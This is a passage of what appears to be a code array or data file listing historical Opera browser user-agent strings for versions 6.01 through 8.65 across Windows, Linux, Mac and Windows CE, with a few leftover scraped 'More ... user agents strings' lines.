    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; Sprint:PPC-6700) Opera 8.65 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320)Opera 8.65 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320) Opera 8.65 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [zh-cn]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [nl]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.65 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC) Opera 8.65 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Opera 8.60 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.60 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x240) Opera 8.60 [en]",
    "Opera/8.54 (X11; Linux i686; U; pl)",
    "Opera/8.54 (X11; Linux i686; U; de)",
    "Opera/8.54 (Windows NT 5.1; U; ru)",
    "Opera/8.54 (Windows NT 5.1; U; pl)",
    "Opera/8.54 (Windows NT 5.1; U; en)",
    "Opera/8.54 (Windows NT 5.0; U; en)",
    "Opera/8.54 (Windows NT 5.0; U; de)",
    "Opera/8.54 (Windows NT 4.0; U; zh-cn)",
    "Opera/8.54 (Windows 98; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; pl) Opera 8.54",
    "Mozilla/5.0 (Windows 98; U; en) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; fr) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; pl) Opera 8.54",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.54",
    "More Opera 8.54 user agents strings -->>",
    "Opera/8.53 (Windows NT 5.2; U; en)",
    "Opera/8.53 (Windows NT 5.1; U; pt)",
    "Opera/8.53 (Windows NT 5.1; U; en)",
    "Opera/8.53 (Windows NT 5.1; U; de)",
    "Opera/8.53 (Windows NT 5.0; U; en)",
    "Opera/8.53 (Windows 98; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.53",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.53",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.53",
    "Opera/8.52 (X11; Linux x86_64; U; en)",
    "Opera/8.52 (X11; Linux i686; U; en)",
    "Opera/8.52 (Windows NT 5.1; U; ru)",
    "Opera/8.52 (Windows NT 5.1; U; en)",
    "Opera/8.52 (Windows NT 5.0; U; en)",
    "Opera/8.52 (Windows ME; U; en)",
    "Mozilla/5.0 (X11; Linux i686; U; en) Opera 8.52",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
    "Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.52",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.52",
    "Opera/8.51 (X11; U; Linux i686; en-US; rv:1.8)",
    "Opera/8.51 (X11; Linux x86_64; U; en)",
    "Opera/8.51 (X11; Linux i686; U; en)",
    "Opera/8.51 (Windows NT 5.1; U; pl)",
    "Opera/8.51 (Windows NT 5.1; U; nb)",
    "Opera/8.51 (Windows NT 5.1; U; fr)",
    "Opera/8.51 (Windows NT 5.1; U; en)",
    "Opera/8.51 (Windows NT 5.1; U; de)",
    "Opera/8.51 (Windows NT 5.0; U; en)",
    "Opera/8.51 (Windows 98; U; en)",
    "Opera/8.51 (Macintosh; PPC Mac OS X; U; de)",
    "Opera/8.51 (FreeBSD 5.1; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; ru) Opera 8.51",
    "Mozilla/5.0 (Windows NT 5.1; U; fr) Opera 8.51",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
    "Mozilla/5.0 (Windows ME; U; en) Opera 8.51",
    "Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.51",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; ru) Opera 8.51",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.51",
    "More Opera 8.51 user agents strings -->>",
    "Opera/8.50 (Windows NT 5.1; U; ru)",
    "Opera/8.50 (Windows NT 5.1; U; pl)",
    "Opera/8.50 (Windows NT 5.1; U; fr)",
    "Opera/8.50 (Windows NT 5.1; U; es-ES)",
    "Opera/8.50 (Windows NT 5.1; U; en)",
    "Opera/8.50 (Windows NT 5.1; U; de)",
    "Opera/8.50 (Windows NT 5.0; U; fr)",
    "Opera/8.50 (Windows NT 5.0; U; en)",
    "Opera/8.50 (Windows NT 5.0; U; de)",
    "Opera/8.50 (Windows NT 4.0; U; zh-cn)",
    "Opera/8.50 (Windows ME; U; en)",
    "Opera/8.50 (Windows 98; U; ru)",
    "Opera/8.50 (Windows 98; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
    "Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.50",
    "Mozilla/5.0 (Windows NT 5.0; U; de) Opera 8.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; ru) Opera 8.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 8.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; tr) Opera 8.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.50",
    "More Opera 8.50 user agents strings -->>",
    "Opera/8.10 (Windows NT 5.1; U; en)",
    "Opera/8.02 (Windows NT 5.1; U; ru)",
    "Opera/8.02 (Windows NT 5.1; U; en)",
    "Opera/8.02 (Windows NT 5.1; U; de)",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows ME; pl) Opera 8.02",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; de) Opera 8.02",
    "Opera/8.01 (Windows NT 5.1; U; pl)",
    "Opera/8.01 (Windows NT 5.1; U; fr)",
    "Opera/8.01 (Windows NT 5.1; U; en)",
    "Opera/8.01 (Windows NT 5.1; U; de)",
    "Opera/8.01 (Windows NT 5.0; U; de)",
    "Opera/8.01 (Macintosh; U; PPC Mac OS; en)",
    "Opera/8.01 (Macintosh; PPC Mac OS X; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.01",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.01",
    "Opera/8.00 (Windows NT 5.1; U; en)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.00",
    "Opera/8.0 (X11; Linux i686; U; cs)",
    "Opera/8.0 (Windows NT 5.1; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; IT) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE) Opera 8.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en) Opera 8.0",
    "Mozilla/5.0 (X11; Linux i386; U) Opera 7.60  [en-GB]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 7.60",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54u1  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.54u1  [en]",
    "Opera/7.54 (X11; Linux i686; U)  [en]",
    "Opera/7.54 (Windows NT 5.1; U) [en]",
    "Opera/7.54 (Windows NT 5.1; U)  [it]",
    "Opera/7.54 (Windows NT 5.1; U)  [en]",
    "Opera/7.54 (Windows NT 5.1; U)  [de]",
    "Opera/7.54 (Windows NT 5.0; U)  [en]",
    "Opera/7.54 (Windows NT 5.0; U)  [de]",
    "Opera/7.54 (Windows 98; U)  [de]",
    "Mozilla/5.0 (X11; Linux i686; U) Opera 7.54 [en]",
    "Mozilla/5.0 (X11; Linux i686; U) Opera 7.54  [en]",
    "Mozilla/5.0 (Windows NT 5.1; U) Opera 7.54  [de]",
    "Mozilla/5.0 (Windows NT 5.0; U) Opera 7.54  [en]",
    "Mozilla/4.78 (Windows NT 5.1; U) Opera 7.54  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686) Opera 7.54  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.54  [pl]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.54  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC) Opera 7.54  [en]",
    "More Opera 7.54 user agents strings -->>",
    "Opera/7.53 (X11; Linux i686; U) [en_US]",
    "Opera/7.53 (Windows NT 5.1; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.53  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows ME) Opera 7.53  [en]",
    "Opera/7.52 (Windows NT 5.1; U) [en]",
    "Opera/7.52 (Windows NT 5.1; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.52 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.52  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.52  [en]",
    "Opera/7.51 (X11; SunOS sun4u; U) [de]",
    "Opera/7.51 (Windows NT 5.1; U) [en]",
    "Opera/7.51 (Linux) [en]",
    "Mozilla/4.78 (Windows NT 5.1; U) Opera 7.51  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.51  [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.51  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.51  [en]",
    "Opera/7.50 (Windows XP; U)",
    "Opera/7.50 (Windows NT 5.1; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.50  [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.50  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.50  [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.50  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.50  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; ; Linux x86_64) Opera 7.50 [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; ; Linux i686) Opera 7.50 [en]",
    "Opera/7.23 (Windows NT 6.0; U)  [zh-cn]",
    "Opera/7.23 (Windows NT 5.1; U; sv)",
    "Opera/7.23 (Windows NT 5.0; U) [en]",
    "Opera/7.23 (Windows NT 5.0; U)  [fr]",
    "Opera/7.23 (Windows NT 5.0; U)  [en]",
    "Opera/7.23 (Windows 98; U) [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686) Opera 7.23  [fi]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23 [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [en-GB]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.23  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.23  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.23  [ca]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0) Opera 7.23  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.23  [en]",
    "Opera/7.22 (Windows NT 5.1; U)  [de]",
    "Opera/7.21 (Windows NT 5.1; U)  [en]",
    "Mozilla/5.0 (Windows NT 5.0; U) Opera 7.21  [en]",
    "Opera/7.20 (Windows NT 5.1; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.20  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.20  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.20  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.20  [de]",
    "Opera/7.11 (Windows NT 5.1; U)  [pl]",
    "Opera/7.11 (Windows NT 5.1; U)  [en]",
    "Opera/7.11 (Windows NT 5.1; U)  [de]",
    "Opera/7.11 (Windows NT 5.0; U)  [en]",
    "Opera/7.11 (Windows NT 5.0; U)  [de]",
    "Opera/7.11 (Windows 98; U)  [en]",
    "Opera/7.11 (Windows 98; U)  [de]",
    "Opera/7.11 (Linux 2.6.0-test4 i686; U)  [en]",
    "Mozilla/5.0 (Windows NT 5.1; U) Opera 7.11  [en]",
    "Mozilla/5.0 (Windows NT 5.0; U) Opera 7.11  [en]",
    "Mozilla/5.0 (Linux 2.4.21-0.13mdk i686; U) Opera 7.11  [en]",
    "Mozilla/4.78 (Windows NT 5.0; U) Opera 7.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.11  [ru]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.11  [fr]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0) Opera 7.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows ME) Opera 7.11  [en]",
    "More Opera 7.11 user agents strings -->>",
    "Opera/7.10 (Windows NT 5.1; U)  [en]",
    "Opera/7.10 (Windows NT 5.0; U)  [en]",
    "Opera/7.10 (Windows NT 4.0; U)  [de]",
    "Opera/7.10 (Linux Debian;en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.10  [fr]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.10  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.10  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0) Opera 7.10  [de]",
    "Mozilla/3.0 (Windows NT 5.0; U) Opera 7.10  [de]",
    "Opera/7.03 (Windows NT 5.1; U)  [en]",
    "Opera/7.03 (Windows NT 5.1; U)  [de]",
    "Opera/7.03 (Windows NT 5.0; U)  [en]",
    "Opera/7.03 (Windows NT 5.0; U)  [de]",
    "Opera/7.03 (Windows NT 4.0; U)  [en]",
    "Opera/7.03 (Windows 98; U)  [en]",
    "Opera/7.03 (Windows 98; U)  [de]",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.6) Gecko/2009020911 Ubuntu/8.10 (intrepid) Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.03 [de]",
    "Mozilla/5.0 (Windows NT 5.1; U) Opera 7.03  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.03  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows ME) Opera 7.03  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.03  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 95) Opera 7.03  [de]",
    "Opera/7.02 (Windows NT 5.1; U)  [fr]",
    "Opera/7.02 (Windows 98; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.02  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.02  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows ME) Opera 7.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.02  [en]",
    "Opera/7.01 (Windows NT 5.1; U)  [en]",
    "Opera/7.01 (Windows NT 5.0; U)  [en]",
    "Opera/7.01 (Windows 98; U)  [fr]",
    "Opera/7.01 (Windows 98; U)  [en]",
    "Mozilla/5.0 (Windows NT 5.0; U) Opera 7.01  [en]",
    "Mozilla/4.78 (Windows NT 5.0; U) Opera 7.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.01  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.01  [en]",
    "Mozilla/3.0 (Windows NT 5.0; U) Opera 7.01  [en]",
    "Opera/7.0 (Windows NT 5.1; U)  [en]",
    "Opera/7.0 (Windows NT 4.0; U)  [en]",
    "Opera/7.0 (Windows NT 4.0; U)  [de]",
    "Opera/7.0 (Windows 98; U)  [en]",
    "Opera/7.0 (Windows 2000; U)  [en]",
    "Opera/7.0 (Windows 2000; U)  [de]",
    "Mozilla/5.0 (Windows 2000; U) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows XP) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.0  [de]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 4.0) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows ME) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 98) Opera 7.0  [en]",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows 2000) Opera 7.0  [en]",
    "Opera/6.12 (Linux 2.4.20-4GB i686; U)  [en]",
    "Opera/6.12 (Linux 2.4.18-14cpq i686; U)  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.12  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.20-4GB i686) Opera 6.12  [de]",
    "Opera/6.11 (Linux 2.4.18-bf2.4 i686; U)  [en]",
    "Opera/6.11 (Linux 2.4.18-4GB i686; U)  [en]",
    "Opera/6.11 (Linux 2.4.10-4GB i686; U)  [en]",
    "Opera/6.11 (FreeBSD 4.7-RELEASE i386; U)  [en]",
    "Mozilla/5.0 (Linux 2.4.19-16mdk i686; U) Opera 6.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.11  [fr]",
    "Mozilla/4.0 (compatible; MSIE 5.0; UNIX) Opera 6.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.4 i686) Opera 6.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.20-13.7 i686) Opera 6.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.19-4GB i686) Opera 6.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.19-16mdk i686) Opera 6.11  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.18 i686) Opera 6.11  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.10-4GB i686) Opera 6.11  [en]",
    "Mozilla/5.0 (Linux 2.4.18-ltsp-1 i686; U) Opera 6.1  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.19 i686) Opera 6.1  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.18-4GB i686) Opera 6.1  [de]",
    "Mozilla/5.0 (Windows XP; U) Opera 6.06  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.06  [fr]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.06  [de]",
    "Opera/6.05 (Windows XP; U) [en]",
    "Opera/6.05 (Windows XP; U)  [en]",
    "Opera/6.05 (Windows XP; U)  [de]",
    "Opera/6.05 (Windows NT 4.0; U)  [ro]",
    "Opera/6.05 (Windows NT 4.0; U)  [fr]",
    "Opera/6.05 (Windows NT 4.0; U)  [de]",
    "Opera/6.05 (Windows ME; U)  [fr]",
    "Opera/6.05 (Windows ME; U)  [de]",
    "Opera/6.05 (Windows 98; U)  [fr]",
    "Opera/6.05 (Windows 98; U)  [en]",
    "Opera/6.05 (Windows 98; U)  [de]",
    "Opera/6.05 (Windows 2000; U)  [oc]",
    "Opera/6.05 (Windows 2000; U)  [ja]",
    "Opera/6.05 (Windows 2000; U)  [it]",
    "Opera/6.05 (Windows 2000; U)  [fr]",
    "Opera/6.05 (Windows 2000; U)  [en]",
    "Opera/6.05 (Windows 2000; U)  [de]",
    "Mozilla/5.0 (Windows XP; U) Opera 6.05  [de]",
    "Mozilla/5.0 (Windows NT 4.0; U) Opera 6.05  [en]",
    "Mozilla/5.0 (Windows ME; U) Opera 6.05  [de]",
    "More Opera 6.05 user agents strings -->>",
    "Opera/6.04 (Windows XP; U)  [en]",
    "Opera/6.04 (Windows XP; U)  [de]",
    "Opera/6.04 (Windows NT 4.0; U)  [en]",
    "Opera/6.04 (Windows NT 4.0; U)  [de]",
    "Opera/6.04 (Windows 98; U)  [en-GB]",
    "Opera/6.04 (Windows 2000; U)  [en]",
    "Opera/6.04 (Windows 2000; U)  [de]",
    "Mozilla/5.0 (Windows 2000; U) Opera 6.04  [en]",
    "Mozilla/4.78 (Windows 2000; U) Opera 6.04  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.04  [fr]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.04  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.04  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.04  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.04  [pl]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.04  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.04  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.04  [de]",
    " Opera/6.04 (Windows XP; U)  [de]",
    " Opera/6.04 (Windows 2000; U)  [en]",
    " Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.04  [en]",
    "More Opera 6.04 user agents strings -->>",
    "Opera/6.03 (Windows NT 4.0; U)  [en]",
    "Opera/6.03 (Windows 98; U) [en]",
    "Opera/6.03 (Windows 2000; U)  [en]",
    "Opera/6.03 (Linux 2.4.18-18.7.x i686; U)  [en]",
    "Mozilla/5.0 (Windows 2000; U) Opera 6.03  [en]",
    "Mozilla/5.0 (Linux 2.4.18-18.7.x i686; U) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.20-4GB i686) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.19-4GB i686) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.18-4GB i686) Opera 6.03  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.0-64GB-SMP i686) Opera 6.03  [en]",
    "Opera/6.02 (Windows NT 4.0; U)  [de]",
    "Mozilla/5.0 (Windows 2000; U) Opera 6.02  [en]",
    "Mozilla/5.0 (Linux; U) Opera 6.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Opera 6.02  [de]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.20-686 i686) Opera 6.02  [en]",
    "Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.18-4GB i686) Opera 6.02  [en]",
    " Opera/6.02 (Windows NT 4.0; U)  [de]",
    "Opera/6.01 (X11; U; nn)",
    "Opera/6.01 (Windows XP; U)  [de]",
    "Opera/6.01 (Windows 98; U)  [en]",
    "Opera/6.01 (Windows 98; U)  [de]",
    "Opera/6.01 (Windows 2000; U)  [en]",
    "Opera/6.01 (Windows 2000; U)  [de]",
    "Mozilla/5.0 (Windows 2000; U) Opera 6.01  [en]",
    "Mozilla/5.0 (Windows 2000; U) Opera 6.01  [de]",
